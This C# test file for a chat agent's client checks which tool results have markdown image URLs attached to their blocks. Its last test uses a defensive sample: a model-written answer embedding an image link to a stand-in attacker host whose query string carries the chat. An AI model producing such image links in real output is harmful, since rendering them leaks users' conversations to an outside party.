using LouisAgent.Web.Shared.Api;
using LouisAgent.Web.Shared.Chats;
using static LouisAgent.Web.Shared.Tests.StreamEvents;

namespace LouisAgent.Web.Shared.Tests.Chats;

// FX22: the images a tool gave. A tool_result whose text holds a markdown image gives its block that URL when the result arrives, before anything can cut the
// text; a sub-session's result does the same on its own turn; a plain link is no image, a failed result gives none, and neither does the result of a
// delegation call (that text is the specialist's own answer, written by a model, not something a tool read). Written first: Block.Images stayed empty.
public class TurnStreamImageTests
{
    private const string Page = "# Bobotie\n\n![Bobotie](https://example.co.za/bobotie.jpg)\n\nIngredients";

    private static Turn Apply(params AgentStreamEvent[] events)
    {
        var turn = new Turn();
        foreach (var streamEvent in events) TurnStream.Apply(turn, streamEvent);
        return turn;
    }

    [Test]
    public void AToolResultWithAnImage_GivesItsBlockTheUrl()
    {
        var turn = Apply(ToolUse("c1", "FetchUrl"), ToolResult("c1", Page));

        Assert.That(turn.Blocks[0].Images, Is.EqualTo(new[] { "https://example.co.za/bobotie.jpg" }));
    }

    [Test]
    public void ASubSessionsToolResult_GivesTheUrlToItsOwnTurnsBlock()
    {
        var turn = Apply(
            ToolUse("d1", "StartSubSession"),
            InSubSession("d1", ToolUse("c1", "FetchUrl")),
            InSubSession("d1", ToolResult("c1", Page)));

        Assert.That(turn.Blocks[0].SubTurn!.Blocks[0].Images, Is.EqualTo(new[] { "https://example.co.za/bobotie.jpg" }));
        Assert.That(turn.Blocks[0].Images, Is.Empty, "the parent's own call has none");
    }

    [Test]
    public void APlainLink_IsNoImage() =>
        Assert.That(Apply(ToolUse("c1", "FetchUrl"), ToolResult("c1", "See [the page](https://example.co.za/bobotie)")).Blocks[0].Images, Is.Empty);

    [Test]
    public void AFailedResult_GivesNone() =>
        Assert.That(Apply(ToolUse("c1", "FetchUrl"), ToolResult("c1", Page, failed: true)).Blocks[0].Images, Is.Empty);

    [Test]
    public void TheResultOfADelegationCall_GivesNone_BecauseItIsTheSpecialistsAnswerNotWhatAToolRead() =>
        Assert.That(Apply(ToolUse("d1", "StartSubSession"), ToolResult("d1", "![Bobotie](https://evil.example/?q=the+chat)")).Blocks[0].Images, Is.Empty);
}
